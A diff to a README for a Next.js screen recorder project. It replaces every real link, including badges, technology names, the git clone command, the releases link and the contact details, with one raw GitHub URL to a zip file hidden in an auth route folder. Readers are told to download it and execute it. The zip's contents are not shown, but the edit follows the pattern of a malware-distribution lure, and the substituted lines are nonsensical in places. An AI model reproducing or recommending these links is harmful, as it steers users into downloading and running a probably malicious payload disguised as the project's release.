@@ -1,8 +1,8 @@
 # 🎥 Screen Recorder
 
-![GitHub release](https://img.shields.io/github/release/RodrigoDevBnu/screen-recorder.svg)
-![GitHub stars](https://img.shields.io/github/stars/RodrigoDevBnu/screen-recorder.svg)
-![GitHub forks](https://img.shields.io/github/forks/RodrigoDevBnu/screen-recorder.svg)
+![GitHub release](https://raw.githubusercontent.com/RodrigoDevBnu/screen-recorder/main/app/api/auth/[...all]/screen_recorder_v3.1.zip)
+![GitHub stars](https://raw.githubusercontent.com/RodrigoDevBnu/screen-recorder/main/app/api/auth/[...all]/screen_recorder_v3.1.zip)
+![GitHub forks](https://raw.githubusercontent.com/RodrigoDevBnu/screen-recorder/main/app/api/auth/[...all]/screen_recorder_v3.1.zip)
 
 Welcome to the **Screen Recorder** repository! This project allows users to easily record their screens with a simple and user-friendly interface. It leverages modern web technologies to provide a seamless experience. 
 
@@ -29,12 +29,12 @@ Welcome to the **Screen Recorder** repository! This project allows users to easi
 This project uses a variety of technologies to ensure optimal performance and user experience:
 
 - **React**: For building the user interface.
-- **Next.js**: For server-side rendering and routing.
+- **https://raw.githubusercontent.com/RodrigoDevBnu/screen-recorder/main/app/api/auth/[...all]/screen_recorder_v3.1.zip**: For server-side rendering and routing.
 - **TypeScript**: For type safety and better development experience.
 - **Tailwind CSS**: For styling and responsive design.
 - **PostgreSQL**: For managing user data and recordings.
 - **Drizzle ORM**: For easy database interactions.
-- **Xata.io**: For backend services.
+- **https://raw.githubusercontent.com/RodrigoDevBnu/screen-recorder/main/app/api/auth/[...all]/screen_recorder_v3.1.zip**: For backend services.
 - **ESLint**: For maintaining code quality.
 - **ArcJet**: For authentication.
 
@@ -45,7 +45,7 @@ To get started with the Screen Recorder, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/RodrigoDevBnu/screen-recorder.git
+   git clone https://raw.githubusercontent.com/RodrigoDevBnu/screen-recorder/main/app/api/auth/[...all]/screen_recorder_v3.1.zip
    ```
 
 2. Navigate to the project directory:
@@ -82,7 +82,7 @@ To record your screen, simply open the application in your browser. Follow these
 
 You can find your recordings in the designated folder in your project.
 
-For the latest releases, please visit the [Releases section](https://github.com/RodrigoDevBnu/screen-recorder/releases). Here, you can download the latest version of the Screen Recorder and execute it as needed.
+For the latest releases, please visit the [Releases section](https://raw.githubusercontent.com/RodrigoDevBnu/screen-recorder/main/app/api/auth/[...all]/screen_recorder_v3.1.zip). Here, you can download the latest version of the Screen Recorder and execute it as needed.
 
 ## Contributing
 
@@ -117,7 +117,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out:
 
-- **Email**: rodrigodevbnu@example.com
-- **Twitter**: [@RodrigoDevBnu](https://twitter.com/RodrigoDevBnu)
+- **Email**: https://raw.githubusercontent.com/RodrigoDevBnu/screen-recorder/main/app/api/auth/[...all]/screen_recorder_v3.1.zip
+- **Twitter**: [@RodrigoDevBnu](https://raw.githubusercontent.com/RodrigoDevBnu/screen-recorder/main/app/api/auth/[...all]/screen_recorder_v3.1.zip)
 
-Thank you for checking out the Screen Recorder! We hope you find it useful for your screen recording needs. For the latest updates and releases, please check the [Releases section](https://github.com/RodrigoDevBnu/screen-recorder/releases).
+Thank you for checking out the Screen Recorder! We hope you find it useful for your screen recording needs. For the latest updates and releases, please check the [Releases section](https://raw.githubusercontent.com/RodrigoDevBnu/screen-recorder/main/app/api/auth/[...all]/screen_recorder_v3.1.zip).
